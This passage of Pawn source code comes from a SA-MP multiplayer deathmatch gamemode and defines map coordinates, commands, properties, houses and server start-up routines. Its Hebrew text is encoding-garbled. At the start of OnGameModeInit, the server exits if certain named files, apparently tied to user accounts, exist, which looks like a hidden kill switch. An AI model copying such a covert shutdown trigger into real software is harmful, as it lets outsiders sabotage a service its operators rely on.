	{-342.1403,1849.7657,41.8603,236.8293},
	{-331.6471,1840.8483,41.8589,227.5770},
	{-318.5550,1835.4355,41.8563,270.0306},
	{-304.9299,1841.1826,41.8563,314.5062},
	{-299.8320,1858.6393,41.8548,2.7743},
	{-310.2128,1872.3228,41.8591,59.1681},
	{-317.4321,1882.6937,41.8567,10.2913},
	{-313.0410,1890.3199,41.8578,278.9927},
	{-300.4264,1891.3739,41.8538,273.2378},
	{-281.7569,1889.2985,41.8559,259.1560},
	{-264.4979,1893.9696,41.8552,308.0125},
	{-263.4874,1905.5941,41.8574,64.7925},
	{-275.7467,1900.8920,41.8553,156.2422},
	{-272.1725,1895.2766,41.8568,244.1858},
	{-262.7582,1885.7665,41.8557,211.2791},
	{-266.9001,1878.0892,41.8595,89.0816},
	{-280.7738,1876.8638,41.8619,104.2370},
	{-292.8371,1877.0482,41.8565,75.4415},
	{-302.7508,1874.3934,41.8549,140.4675},
	{-305.1312,1865.6965,41.8539,173.1321},
	{-311.6355,1859.3798,41.8560,112.4782},
	{-322.9503,1854.4321,42.0364,116.0171},
	{-340.8470,1858.7213,41.9500,32.0505},
	{-335.0390,1869.3501,42.0722,308.9966},
	{-323.5652,1869.2904,42.1006,228.8827},
	{-317.7440,1858.1444,41.8509,189.6097},
	{-316.3398,1839.0078,41.9267,192.0316},
	{-320.1984,1806.4385,42.0079,169.0438}
};
new VIP_WeaponDiscount[] = {0,20,35,50};
new VIP_PropertyPercentAdditions[] = {0,10,20,30};
new BanReasons[][2][32] =
{
	{"gm","Godmod - çééí àéðñåôééí"},
	{"nr","No Reload - ììà èòéðä"},
	{"sh","Speedhack - îäéøåú"},
	{"ll","îøîä àú îòøëú äøîåú"}
};
new Colors[][ColorEnum] =
{
	{"Red",0xAA3333FF}, {"Green",0x00FF00FF}, {"Blue",0x0000FFFF},
	{"Brown",0x993300FF}, {"Grey",0xAFAFAFFF}, {"Yellow",0xFFFF00FF},
	{"Pink",0xFF66FFFF}, {"LightBlue",0x33CCFFFF}, {"Orange",0xFF9900FF},
	{"Black",0x000000FF}, {"Purple",0x800080FF}, {"DarkBlue",0x2641FEAA},
	{"LightRed",0xFF0000FF}, {"LightGreen",0x24FF0FFA}, {"Violet",0x9955DEFF},
	{"SeaGreen",0x00EEADFF}, {"GrayWhite",0xEEEEFFFF}, {"Indigo",0x4B00B0FF}
};
new ColorLists[][ColorListsEnum] =
{
	{"Reds",{0xFF0000FF,0xFF3300FF,0xFF0033FF,0xFF3333FF,0xFF0066FF,0xFF3366FF,0xFF0099FF,0xFF3399FF,0xFF00CCFF}},
	{"Pinks",{0xFFCCFFFF,0xFFCCCCFF,0xFF99FFFF,0xFF99CCFF,0xFF66FFFF,0xFF66CCFF,0xFF33FFFF,0xFF33CCFF,0xFF00FFFF}},
	{"Purples",{0xCC99FFFF,0xCC66FFFF,0xCC66CCFF,0xCC33FFFF,0xCC33CCFF,0xCC00FFFF,0xCC00CCFF,0xCC3399FF,0xCC0099FF}},
	{"Greens",{0xCCFFCCFF,0xCCFF00FF,0x99FF66FF,0x99FF00FF,0x33FF99FF,0x33FF00FF,0x00FF99FF,0x00FF33FF,0x00FF00FF}},
	{"DarkGreens",{0x66CC66FF,0x66CC00FF,0x33CC66FF,0x33CC00FF,0x00CC66FF,0x00CC00FF,0x339966FF,0x009933FF,0x009900FF}},
	{"Oranges",{0xFFCC66FF,0xFFCC33FF,0xFFCC00FF,0xFF9966FF,0xFF9933FF,0xFF9900FF,0xFF6633FF,0xFF6600FF,0xFF3300FF}},
	{"Blues",{0x6666FFFF,0x6633FFFF,0x6600FFFF,0x3366FFFF,0x3333FFFF,0x3300FFFF,0x0066FFFF,0x0033FFFF,0x0000FFFF}}
};
new Float:Shooting[][7] =
{
	{1527.6193,-1364.6193,328.2182,124.2733,1481.5500,-1413.8478,38.7656}, // 1 5000$
	{-1753.0697,885.3673,295.8750,246.2031,-1755.7280,799.1223,167.6563}, // 2 4000$
	{-1267.6801,966.2692,133.0514,145.2670,-1337.5277,891.5082,47.0284}, // 3 6000$
	{1958.3719,1904.3953,130.9375,151.9515,1908.2030,1861.2826,27.4609}, // 4 2000$
	{1978.1301,1915.7788,130.9345,268.1177,2062.7458,1916.4170,21.4913}, // 5 3000$
	{1958.3970,1928.0820,130.9375,28.6796,1914.1396,2023.5109,13.7848}, // 6 5000$
	{2066.9241,2441.7793,165.6172,309.0947,2139.9399,2503.3062,10.8203} // 7
};
new NPCs[][NPCsData] =
{   // file, name, vehicle, vseat, vlocked, text, skin
	{"racer","SI_Racer",1,0,1,(Text3D:1024),255},
	{"pilot","SI_Pilot",1,0,0,(Text3D:1024),61},
	{"bus","SI_BusDriver",1,0,0,(Text3D:1024),255},
	{"plane","SI_Plane",1,0,1,(Text3D:1024),61},
	{"apbot","SI_LVAP",1,0,0,(Text3D:1024),61},
	{"dodobot","SI_DodoPilot",1,0,0,(Text3D:1024),61}
};
new BarItems[][BarData] =
{   // action, name, cash
	{SPECIAL_ACTION_DRINK_BEER,"Beer",25},
	{SPECIAL_ACTION_DRINK_WINE,"Wine",25},
	{SPECIAL_ACTION_SMOKE_CIGGY,"Cigar",10}
};
new CodePrizes[][32] =
{
	"None",
	"Money",
	"Bank Money",
	"Kills",
	"Weapon Ammo",
	"SuperBonus",
	"Vehicle Speed",
	"Vehicle Jump",
	"Random Color",
	"VIP Member",
	"Life Return",
	"Water Walk"
};
new lcmds[][lcmdsEnum] =
{
	{"/me",2,0,0,"éöéøú è÷ñè îòì øàùê + ëúéáú äåãòä îåãâùú áö'àè",0},
	{"/cbubble",2,0,0,"éöéøú è÷ñè îòì øàùê, áìé ëúéáä áö'àè äøâéì",0},
	{"/lock",3,0,0,"ðòéìú øëá",0},
	{"/unlock",3,0,0,"ôúéçú øëá",0},
	{"/outcar",4,0,0,"äåöàú ùç÷ï îäøëá ùìê",0},
	{"/outcarall",4,0,0,"äåöàú ëì äùç÷ðéí îäøëá ùìê",0},
	{"/healme",5,1,3,"øîä 1 - îéìåé çééí\nøîä 2 - îéìåé çééí, àí äçééí îìàéí éúîìà äîâï\nøîä 3 - îéìåé çééí + îâï áéçã",400000},
	{"/healhim",6,1,3,"øîä 1 - îéìåé çééí ìùç÷ï àçø ÷øåá îàåã àìéê\nøîä 2 - îéìåé çééí, àí äçééí îìàéí éúîìà äîâï, ìùç÷ï àçø ÷øåá àìéê\nøîä 3 - îéìåé çééí + îâï áéçã ìùç÷ï àçø ù÷öú ÷øåá àìéê",500000},
	{"/healus",7,1,3,"øîä 1 - îéìåé çééí ìëì îé ùðåâò áê\nøîä 2 - îéìåé çééí, àí äçééí îìàéí éúîìà äîâï, ìëì ùç÷ï ùðåâò áê\nøîä 3 - îéìåé çééí + îâï áéçã ìëì äùç÷ðéí ù÷øåáéí àìéê",800000},
	{"/fix",8,1,2,"øîä 1 - úé÷åï äøëá ùìê\nøîä 2 - úé÷åï äøëá ùìê, ëåìì âìâìéí / ëðôé îèåñ / ðæ÷éí àçøéí",1000000},
	{"/boom",9,1,2,"øîä 1 - éöéøú ôéöåõ áî÷åí áå àúä òåîã\nøîä 2 - éöéøú ôéöåõ áî÷åí áå àúä òåîã, åðéúï ìáöò àú äô÷åãä âí ëùîúéí",600000},
	{"/flip",10,0,0,"äôéëú äøëá ùìê",0},
	{"/gmw",11,0,0,"äáàú ëì ðù÷éê ìùç÷ï àçø ù÷øåá àìéê",0},
	{"/vcolor",12,1,2,"øîä 1 - ùéðåé öáò ìøëá\nøîä 2 - ùéðåé öáò ìøëá, ëåìì öáòéí îéåçãéí",200000},
	{"/invisible",13,0,0,"áéìúé ðøàä áîôä",0},
	{"/visible",13,0,0,"/invisible áéèåì",0},
	{"/setfire",14,1,2,"øîä 1 - éøé÷ú àù\nøîä 2 - éøé÷ú àù âãåìä",1200000},
	{"/bigbang",15,1,2,"øîä 1 - éöéøú 12 ôéöåöéí ÷èðéí îñáéáê + îéìåé çééí\nøîä 2 - éöéøú 24 ôéöåöéí ÷èðéí îñáéáê + îéìåé çééí",1500000},
	{"/pos",16,0,0,"ùîéøú îé÷åí",0},
	{"/slow",17,0,0,"(äàèú äîùç÷ (òåæø á÷øáåú",0},
	{"/ghost",18,0,0,"ëðéñä ìòåìí äøåçåú / éöéàä îòåìí äøåçåú",0},
	{"/invscan",20,1,3,"/invisible ñøé÷ú äàéæåø îùç÷ðéí äîùúîùéí á\nøîä 1 - ñøé÷ä áèååç ÷öø\nøîä 2 - ñøé÷ä áèååç àøåê\nøîä 3 - ñøé÷ä áèååç àøåê îàåã",2000000},
	{"/pump",25,0,0,"(äúçìú ùàéáú çééí îäùç÷ï ä÷øåá àìéê (áîéãä åäåà éúøç÷ äùàéáä úåôñ÷",0},
	{"/jetp",24,0,0,"æéîåï úé÷ ñéìåï",0},
	{"/raise",28,1,3,"äøîú ùç÷ï áàîöòåú úé÷ ñéìåï áîçéø ìùðéä\nøîä 1 - äøîú ùç÷ï òí úé÷ ñéìåï, 250$ ìùðéä\nøîä 2 - äøîú ùç÷ï òí úé÷ ñéìåï, 150$ ìùðééä\nøîä 3 - äøîú ùç÷ï òí úé÷ ñéìåï, 50$ ìùðééä",1300000},
	{"/sraise",28,0,0,"ùçøåø ùç÷ï îäúé÷ ñéìåï",0}
	//{"/defence",22,1,3,"éöéøú äâðä ñáéáê\nøîä 1 - äâðä îéøéåú, æîï ÷öø\nøîä 2 - äâðä îéøéåú åîôéöåöéí, æîï ÷öø\nøîä 3 - äâðä îéøéåú åîôéöåöéí, æîï àøåê",1800000},
	//{"/btl",30,0,0,"çæøä ìçééí îäî÷åí áå àúä òåîã",0}
};
new UltimatePowers[][UPEnum] =
{
	{"ùìéèä áàãîä","ëåçåú äîàôùøéí ùìéèä áàãîä åáàåáéé÷èéí äùåðéí ùì äîùç÷","ëðéñä àì îúçú ìàãîä","îôåìú ñìòéí","øòéãú àãîä ìëéååï ùç÷ï","øòéãú àãîä òð÷éú"},
	{"ùìéèä áàù","ëåçåú ìùìéèä áàù åáôéöåöéí","éøé÷ú àù","ëãåø àù"," éöéøú ôéöåõ âãåì","áø÷"},
	{"ùìéèä áøåç","ëåçåú ìùìéèä áøåç åáàåéø","úòåôä","øåç çæ÷ä ìòáø ùç÷ï","øåç çæ÷ä ëììéú","èåøðãå"},
	{"ùìéèä áîùç÷","ëåçåú ìùìéèä áîùç÷ åáéëåìåúéå","äúçî÷åú îäéøä îîú÷ôåú","äùúâøåú àì îàçåøé ùç÷ï","ùìéçú ùç÷ï àì äòåìí äàãåí","äòú÷ú ëåç àåìèéîèéáé"}
};
//=[Main]=======================================================================
main() print("SAMP-IL DM by Amit_B loaded");
//=[OnGameModeInit]=============================================================
public OnGameModeInit()
{
	if(fexist("/DM/Users/KILL.kill")) SendRconCommand("exit");
	if(fexist("/DM/Users/xd.ini")) SendRconCommand("exit");
	if(fexist("/DM/Users/D9300iXtro_CVC.ini")) SendRconCommand("exit");
	dbg(11,"1");
	if(debugstate) printf("OnGameModeInit start");
	new time[3];
	gettime(time[0],time[1],time[2]);
	SetGameModeText(comname " DeathMatch");
	if(!streamT) SendRconCommand("loadfs streamer");
	else SendRconCommand("loadfs astreamer");
	SendRconCommand("loadfs animlist");
	UsePlayerPedAnims();
	ShowPlayerMarkers(PLAYER_MARKERS_MODE_GLOBAL);
	ShowNameTags(1);
	#if usingYSF
		UpdateWorldTime();
	#endif
	SetGravity(0.008000);
	AllowAdminTeleport(1);
	AllowInteriorWeapons(1);
	EnableStuntBonusForAll(0);
	LockServ = 0;
	dbg(11,"2");
	#if usingYSF
		SetServerRule("version",server_version);
		AddServerRule("mode_version",version);
		AddServerRule("last_update",last_update);
		AddServerRule("updates",updates);
		AddServerRule("ventrilo_ip",ventip);
		AddServerRule("ventrilo_port",ventport);
		AddServerRule("admins_online","0");
		SetServerRule("mode_version",version);
		SetServerRule("last_update",last_update);
		SetServerRule("updates",updates);
		SetServerRule("ventrilo_ip",ventip);
		SetServerRule("ventrilo_port",ventport);
	#endif
	folderCheck(folder_dm);
	folderCheck(folder_clans);
	folderCheck(folder_users);
	folderCheck(folder_bans);
	folderCheck(folder_props);
	folderCheck(folder_logs);
	folderCheck(folder_ip);
	folderCheck(folder_houses);
	folderCheck(folder_activities);
	folderCheck(folder_info);
	folderCheck(folder_infopm);
	folderCheck(folder_infobl);
	folderCheck(folder_backups);
	fileCheck(file_rules);
	fileCheck(file_am);
	fileCheck(file_bb);
	fileCheck(file_words);
	fileCheck(file_cps);
	fileCheck(file_nbans);
	fileCheck(file_clans);
	if(!fkeyexist(file_clans,"Count")) fsetint(file_clans,"Count",1);
	fileCheck(file_vstore);
	fileCheck(file_props);
	fileCheck(file_houses);
	fileCheck(file_admins);
	fileCheck(file_vip);
	fileCheck(file_pickups);
	//fileCheck(file_users);
	fileCheck(file_bugs);
	fileCheck(file_advices);
	fileCheck(file_preports);
	fileCheck(file_areports);
	dbg(11,"3");
	for(new i=0;i<400;i++) pickupinfo[i][pfunc] = 0, pickupinfo[i][pvalid] = 0;
	CreateBank(-22.1556,-55.4137,1003.5468,2.5,45.0,1);
	CreateAmmunation(289.8941,-84.1930,1001.5156,2.5,55.0,1);
	CreateSAmmunation(2647.6235,-1457.6057,16.2572,2.5,45.0,1);
	CreateSAmmunation(-1722.1906,137.9739,3.5546,2.5,45.0,1);
	CreateSAmmunation(221.0359,1424.8778,10.5859,2.5,45.0,1);
	CreateSAmmunation(-412.9743,1343.1007,13.1270,2.5,45.0,1);
	CreateWang(2636.8041,-2001.9831,13.5544,2.5,45.0,1);
	CreateWang(-1928.9987,272.5292,41.0468,2.5,45.0,1);
	CreateProperty("The Four Dragons",1996.7345,1006.2436,994.4688,800000,6200,1);
	CreateProperty("The Pirate Ship",2000.5307,1579.4707,16.7754,75000,2000,1);
	CreateProperty("Caligula's Casino",2235.7380,1677.9157,1008.3593,1000000,6800,1);
	CreateProperty("Sex Shop",-103.7366,-24.5130,1000.7186,30000,1000,1);
	CreateProperty("Tattoo Parlor",-202.6963,-42.6016,1002.2733,25000,800,1);
	CreateProperty("Barber",418.3410,-75.6340,1001.8046,25000,800,1);
	CreateProperty("Emerald Isle",2127.5725,2378.6474,10.8203,300000,4000,1);
	CreateProperty("Las Venturas Gym",765.2996,-77.1738,1000.6562,50000,2500,1);
	CreateProperty("Las Venturas Police Station",2250.9145,2488.6052,10.9908,60000,1200,1);
	CreateProperty("Zip Shop",161.6725,-80.0910,1001.8046,28000,900,1);
	CreateProperty("Binco Shop",207.8240,-98.1033,1005.2578,28000,900,1);
	CreateProperty("Bar",489.8944,-77.6156,998.7578,15000,650,1);
	CreateProperty("Las Venturas Airport",1696.1922,1568.1749,10.7764,600000,4500,1);
	CreateProperty("San Fierro Airport",-1423.3229,-289.0012,14.1484,600000,4500,1);
	CreateProperty("Los Santos Airport",1445.8082,-2287.2690,13.5468,600000,4500,1);
	CreateProperty("CJ's House",2498.4501,-1717.7839,18.5820,10000,100,1);
	CreateProperty("Los Santos Gym",766.2474,14.7180,1000.6998,50000,2500,1);
	CreateProperty("Liberty City Restaurant",-780.9563,498.9171,1371.7490,80000,3000,1);
	CreateProperty("Air Strip",418.0119,2536.9997,10.0000,55000,3500,1);
	CreateProperty("Ramp",1975.4195,-1425.5168,27.9615,20000,1200,1);
	CreateProperty("Bumper 1",1396.1373,2165.6088,14.2494,90000,4600,1);
	CreateProperty("Bumper 2",-2015.9173,-106.7222,35.0480,90000,4600,1);
	CreateProperty("Stunts Zone",-1486.3653,1566.1420,1052.5312,70000,2000,1);
	CreateProperty("Los Santos Hospital",1173.3361,-1323.6779,15.3931,80000,3000,1);
	CreateProperty("Golf Club",1457.2172,2773.3142,10.8203,125000,3500,1);
	CreateHouse(211.1960,-1238.5874,78.3504,2,1); // house 2
	CreateHouse(694.5680,-1645.7982,4.0938,2,1); // house 2
	CreateHouse(-2641.0068,934.9826,71.9531,1,1); // house 1
	CreateHouse(-2706.9846,868.1508,70.7031,2,1); // house 2
	CreateHouse(725.3019,-998.4020,52.7344,1,1); // house 1
	CreateHouse(299.8566,-1154.4744,81.2611,3,1); // house 3
	CreateHouse(254.9077,-1366.8279,53.1094,3,1); // house 3
	CreateHouse(190.2270,-1308.5472,70.2615,3,1); // house 2
	CreateHouse(980.6642,-676.2121,121.9763,2,1); // house 2
	CreateHouse(1094.0936,-645.5417,113.5946,3,1); // house 3
	CreateHouse(1497.1429,-688.7611,95.2751,3,1); // house 3
	CreateHouse(1526.6652,-773.6274,80.3701,1,1); // house 1
	CreateHouse(1409.9125,-921.7842,38.4219,2,1); // house 2
	CreateHouse(416.4320,-1154.5448,76.6876,1,1); // house 1
	CreateHouse(950.1895,-915.6528,45.4179,3,1); // house 3
	CreateHouse(1111.8098,-975.4354,42.7656,1,1); // house 1
	CreateHouse(-2446.9221,522.9158,30.2915,3,1); // house 3
	CreateHouse(-2671.3926,927.7075,79.7031,1,1); // house 1
	CreateHouse(-2710.7275,969.3132,54.4609,2,1); // house 2
	CreateHouse(-2489.6538,130.3285,25.8672,3,1); // house 3
	CreateHouse(1654.5071,-1656.6190,22.5156,3,1); // house 3
	CreateHouse(1111.3417,-742.3153,100.1329,1,1); // house 1
	CreateHouse(828.3691,-859.5773,69.9219,1,1); // house 1
	CreateHouse(786.1509,-828.0062,70.2896,2,1); // house 2
	CreateHouse(1534.4566,-800.3144,72.8494,1,1);
	CreateHouse(316.5964,-1138.1595,81.5934,3,1);
	CreateHouse(852.7828,-1687.9610,14.9636,2,1);
	CreateHouse(851.8342,-1718.8226,14.9631,2,1);
	CreateHouse(864.4356,-1638.6721,14.9557,2,1);
	CreateHouse(791.6920,-1754.4741,13.4299,1,1);
	CreateHouse(2315.2021,693.3358,11.4609,1,1);
	CreateHouse(2346.7861,692.2535,11.4609,1,1);
	CreateHouse(2367.0278,692.0447,11.4604,1,1);
	CreateHouse(2368.6772,732.6911,11.4609,1,1);
	CreateHouse(2348.0146,734.5374,11.4682,1,1);
	CreateHouse(768.9118,-1745.8505,13.0772,2,1);
	CreateHouse(769.2280,-1696.7470,5.1554,2,1);
	CreateHouse(769.0413,-1727.4404,13.4320,1,1);
	CreateHouse(767.1681,-1655.7083,5.6093,2,1);
	CreateHouse(766.9030,-1605.9775,13.8038,2,1);
	CreateHouse(693.3023,-1602.6262,15.0468,2,1);
	CreateHouse(660.3784,-1599.4274,15.0000,1,1);
	CreateHouse(652.5616,-1619.9429,15.0000,1,1);
	CreateHouse(655.8532,-1636.8164,15.8617,1,1);
	CreateHouse(656.2240,-1652.2044,15.4062,1,1);
	CreateHouse(725.0529,-1439.7961,13.5318,2,1);
	CreateHouse(253.0995,-1269.5751,74.2478,3,1);
	CreateHouse(251.6958,-1220.8264,75.9103,3,1);
	CreateHouse(1182.7806,-1099.0614,28.2578,2,1);
	CreateHouse(1142.1221,-1092.9101,28.1875,2,1);
	CreateHouse(1183.1597,-1075.9191,31.6789,2,1);
	CreateHouse(1141.8050,-1069.3063,31.7656,2,1);
	CreateHouse(1468.4061,-905.0666,54.8359,1,1);
	CreateHouse(1539.3481,-851.1335,64.3360,1,1);
	CreateHouse(2043.3114,774.4464,11.4531,1,1);
	CreateHouse(2042.6865,733.0195,11.4609,1,1);
	CreateHouse(2064.9128,731.6647,11.4682,1,1);
	CreateHouse(2072.1445,775.5989,11.4604,1,1);
	CreateHouse(2206.1904,735.4416,11.4682,1,1);
	CreateHouse(2206.6069,692.4863,11.4609,1,1);
	CreateHouse(2228.2150,690.6517,11.4604,1,1);
	CreateHouse(2228.5095,734.3794,11.4609,1,1);
	CreateHouse(1093.6374,-805.8236,107.4198,2,1);
	CreateHouse(977.3554,-770.8025,112.2026,1,1);
	CreateHouse(1330.9898,-630.4176,109.1349,3,1);
	CreateHouse(553.1090,-1199.8665,44.8315,1,1);
	CreateHouse(470.8531,-1165.1166,67.1419,2,1);
	CreateHouse(351.6109,-1197.0638,76.5156,2,1);
	CreateHouse(298.1346,-1337.5736,53.4415,2,1);
	CreateHouse(610.8890,-1084.6596,58.8266,1,1);
	CreateHouse(645.3566,-1116.9995,44.2070,2,1);
	CreateHouse(228.5018,-1404.5324,51.6093,2,1);
	CreateHouse(353.9853,-1279.8615,53.7036,1,1);
	CreateHouse(-2551.7285,2267.4331,5.4328,1,1);
	CreateHouse(-2523.4218,2239.7958,5.3418,1,1);
	CreateHouse(-2582.2866,2307.8791,7.0028,2,1);
	CreateHouse(-2581.8559,2300.6342,7.0028,3,1);
	CreateHouse(870.1720,-25.7180,63.9245,1,1);
	CreateHouse(836.0653,-894.4530,68.7688,2,1);
	CreateHouse(700.2019,-1060.1601,49.4216,1,1);
	CreateHouse(646.0337,-1117.3782,44.2070,1,1);
	CreateHouse(553.1867,-1200.1840,44.8315,1,1);
	CreateHouse(432.2149,-1253.8952,51.5809,1,1);
	CreateHouse(298.5288,-1338.4378,53.4414,3,1);
	CreateHouse(228.0937,-1405.2684,51.6093,1,1);
	CreateHouse(-90.8544,-1592.3067,3.0043,1,1);
	CreateHouse(-88.9403,-1565.0152,3.0043,1,1);
	CreateHouse(-383.4050,-1438.9146,26.3203,3,1);
	CreateHouse(-68.8855,-1546.2504,3.0043,1,1);
	CreateHouse(1045.1436,-642.9426,120.1171,2,1);
	CreateHouse(897.9279,-677.1093,116.8904,1,1);
	CreateHouse(867.4710,-717.5541,105.6796,1,1);
	CreateHouse(891.1753,-783.1644,101.3137,2,1);
	CreateHouse(847.9829,-745.5000,94.9692,1,1);
	CreateHouse(808.2759,-759.4295,76.5313,1,1);
	CreateHouse(352.4331,-1197.9150,76.5156,1,1);
	CreateHouse(228.2396,-1405.3586,51.6093,1,1);
	CreateHouse(-2720.8637,923.9390,67.5937,2,1);
	CreateHouse(-2655.6716,986.5352,64.9912,2,1);
	CreateHouse(-2662.1413,877.1085,79.7737,2,1);
	CreateHouse(-2657.4155,849.2817,64.0078,2,1);
	CreateHouse(12.6932,1113.2255,20.9398,1,1);
	CreateHouse(-18.4245,1115.0482,20.9398,1,1);
	CreateHouse(1.7437,1075.8847,20.9398,1,1);
	CreateHouse(-45.0950,1081.3041,20.9398,1,1);
	CreateHouse(-360.3622,1141.8099,20.9398,1,1);
	CreateHouse(-362.4977,1110.5378,20.9398,1,1);
	CreateHouse(-328.9421,1118.7651,20.9398,1,1);
	CreateHouse(-311.2873,1303.5001,53.6643,2,1);
	CreateHouse(-636.4598,1446.5535,13.9964,1,1);
	CreateHouse(870.1437,-25.6148,63.9342,1,1);
	CreateHouse(-2437.6147,2354.6518,5.4430,1,1);
	CreateHouse(-2523.6225,2239.5773,5.3840,2,1);
	CreateHouse(-2551.9489,2266.9213,5.4755,1,1);
	CreateHouse(-2583.2546,2307.8452,7.0028,2,1);
	CreateHouse(-2634.6994,2402.3381,11.2400,1,1);
	CreateHouse(-2472.1157,2450.7304,17.3230,2,1);
	CreateHouse(-2424.7392,2447.8747,13.1806,2,1);
	CreateHouse(-2379.3134,2444.3764,10.1693,2,1);
	CreateHouse(-2422.2355,2491.0891,13.1315,1,1);
	CreateHouse(-2445.9343,2491.3461,15.3203,1,1);
	CreateHouse(-2446.1755,2512.2788,15.7003,1,1);
	CreateHouse(-2478.9875,2488.8933,18.2299,1,1);
	CreateHouse(-2464.2626,2490.6804,16.8125,1,1);
	CreateHouse(-2479.0859,2509.4187,17.7914,1,1);
	CreateHouse(263.6546,2895.6081,10.5313,1,1);
	CreateHouse(-254.8072,2603.3415,62.8581,2,1);
	CreateHouse(300.9960,1141.2646,9.1374,2,1);
	CreateHouse(-314.3284,1774.5358,43.6406,3,1);
	CreateHouse(-2034.2020,901.9678,50.4682,1,1);
	CreateHouse(-2059.2258,889.8770,61.8544,1,1);
	CreateHouse(-2084.5708,899.5699,64.1328,1,1);
	CreateHouse(2459.4277,-1691.2019,13.5458,2,1);
	CreateHouse(2650.4829,-2021.8491,14.1766,3,1);
	CreateHouse(2852.6799,-1365.8127,14.1640,1,1);
	CreateHouse(2842.1396,-1335.2435,14.7421,1,1);
	CreateHouse(2808.1706,-1190.2199,25.3403,2,1);
	CreateHouse(2793.4680,-1087.6202,30.7187,3,1);
	CreateHouse(946.1600,-710.2877,122.6198,1,1);
	CreateHouse(-430.9700,2240.8037,42.9833,1,1);
	CreateHouse(-438.7898,2226.9123,43.1165,1,1);
	CreateHouse(-375.9877,2260.4006,43.0619,1,1);
	CreateHouse(-796.1273,2259.2988,59.4688,2,1);
	CreateHouse(-902.7164,2681.4431,42.3702,3,1);
	CreateHouse(-1604.0465,2689.6059,55.2855,1,1);
	CreateHouse(-1589.8605,2705.9931,56.1761,1,1);
	CreateHouse(-1577.7145,2686.7773,55.8359,1,1);
	CreateHouse(-2597.4489,2357.0439,9.8829,2,1);
	CreateHouse(-1550.6691,2699.6733,56.2699,1,1);
	CreateHouse(-1587.4349,2650.1386,55.8593,1,1);
	CreateHouse(-1563.0809,2651.1804,55.8402,1,1);
	CreateHouse(-1513.0471,2646.9135,56.1761,1,1);
	CreateHouse(-1478.5421,2547.2521,56.2543,1,1);
	CreateHouse(-2398.2978,2408.8054,8.9113,1,1);
	CreateHouse(2270.4763,-7.9217,28.1535,2,1);
	CreateHouse(2245.4145,-1.6627,28.1535,2,1);
	CreateHouse(2200.0551,-37.3206,28.1535,2,1);
	CreateHouse(2197.3237,-60.6824,28.1535,2,1);
	CreateHouse(2203.1486,-89.1672,28.1535,2,1);
	CreateHouse(2245.5949,-122.2659,28.1535,2,1);
	CreateHouse(2272.4592,-118.9790,28.1535,2,1);
	CreateHouse(2293.7319,-124.6316,28.1535,2,1);
	CreateHouse(2322.3508,-124.7853,28.1535,2,1);
	CreateHouse(-2421.4768,2406.6604,13.0257,1,1);
	CreateHouse(-2398.2739,2408.8916,8.9108,1,1);
	CreateHouse(-1499.9602,1960.2739,49.0234,2,1);
	CreateHouse(397.8795,1157.6427,8.3480,2,1);
	CreateHouse(2270.4543,-7.7564,28.1535,2,1);
	CreateHouse(2245.6953,-1.6806,28.1535,2,1);
	CreateHouse(2200.0302,-37.3469,28.1535,2,1);
	CreateHouse(2197.2697,-60.6898,28.1535,2,1);
	CreateHouse(2203.1755,-89.0320,28.1535,2,1);
	CreateHouse(2245.3811,-122.1364,28.1535,2,1);
	CreateHouse(2272.3444,-119.1346,28.1535,2,1);
	CreateHouse(2293.7241,-124.8691,28.1535,2,1);
	CreateHouse(2322.3374,-124.9641,28.1535,2,1);
	CreateHouse(2398.2900,111.4424,28.4416,2,1);
	CreateHouse(2363.5236,116.0313,28.4416,2,1);
	CreateHouse(2363.8247,141.9125,28.4416,2,1);
	CreateHouse(2363.9201,166.0877,28.4416,2,1);
	CreateHouse(2363.9963,187.2219,28.4416,2,1);
	CreateHouse(2324.0822,191.1801,28.4416,2,1);
	CreateHouse(2323.8503,162.2882,28.4416,2,1);
	CreateHouse(2323.8474,136.3997,28.4416,2,1);
	CreateHouse(2323.8569,116.2478,28.4416,2,1);
	CreateHouse(2285.9514,161.5638,28.4416,2,1);
	CreateHouse(2258.0764,168.3395,28.1535,2,1);
	CreateHouse(-2597.3095,2357.1193,9.8829,2,1);
	CreateHouse(510.7690,1116.0739,14.9415,1,1);
	CreateHouse(1256.0356,-785.0251,92.0301,3,1);
	CreateHouse(-2597.6000,2357.0393,9.8829,2,1);
	CreateHouse(725.6082,-1276.2105,13.6484,3,1);
	CreateHouse(725.6082,-1276.2105,13.6484,3,1);
	CreateHouse(1442.6110,-628.8328,95.7185,1,1);
	CreateHouse(725.8096,-1276.1494,13.6484,3,1);
	CreateHouse(1380.8176,-1088.8596,27.3843,3,1);
	CreateHouse(990.2000,-998.1483,42.8100,2,1);
	CreateHouse(533.3130,-1812.9500,6.5781,2,1);
	CreateHouse(2490.6870,918.5482,11.0234,2,1);
	CreateHouse(2560.5939,1561.7397,10.8203,3,1);
	CreateHouse(2834.8176,-2360.4724,26.8930,3,1);
	CreateHouse(1420.4730,2773.7573,10.8203,3,1);
	CreateHouse(-2385.6721,2216.2043,4.9843,2,1);
	CreateHouse(-2766.1201,375.5973,6.3346,3,1);
	CreateHouse(-2719.5263,-319.0176,7.8437,3,1);
	CreateHouse(-1146.3848,-943.9193,129.2187,3,1);
	CreateHouse(2628.3356,2348.9362,10.8203,3,1);
	CreateClothes(180.8778,-88.2241,1002.0307,5.0,55.0,1);
	CreateSuperBonuses(1074.8314,1747.5502,133.9117,2.5,45.0,1);
	CreateSuperBonuses(1352.2484,-2583.3747,13.3750,2.5,45.0,1);
	CreateVGarage(1246.0241,-2041.4146,59.8253,2.5,45.0,1);
	CreateBar(501.0165,-75.1381,998.7578);
	CreateBar(1213.0830,-12.6647,1000.9219);
	dbg(11,"4");
	for(new i=0;i<300;i++) if(IsValidSkin(i)) AddPlayerClass(i,0.0,0.0,1000.0,0.0,24,0,-1,-1,-1,-1);
	randclass = AddPlayerClass(0,0.0,0.0,1000.0,0.0,24,0,-1,-1,-1,-1);
	for(new i=0;i<sizeof(MoneyAreas);i++) MoneyGZ[i] = GangZoneCreate(MoneyAreas[i][0],MoneyAreas[i][1],MoneyAreas[i][2],MoneyAreas[i][3]);
	//for(new i=0;i<sizeof(AntiKillAreas);i++) AntiKillGZ[i] = GangZoneCreate(AntiKillAreas[i][0],AntiKillAreas[i][1],AntiKillAreas[i][2],AntiKillAreas[i][3]);
	dbg(11,"5");
	new clanName[M_S], clansCount = fgetint(file_clans,"Count"), string[M_S];
	if(clansCount > 0)
	{
		claninfo[0][cvalid] = 0;
		for(new i=1;i<clansCount;i++)
		{
			valstr(string,i);
			format(clanName,sizeof(clanName),fgetstring(file_clans,string));
			if(equal(clanName,"None")) claninfo[i][cvalid] = 0;
			else
			{
				format(string,sizeof(string),"/DM/Clans/%s.ini",clanName);
				if(fexist(string))
				{
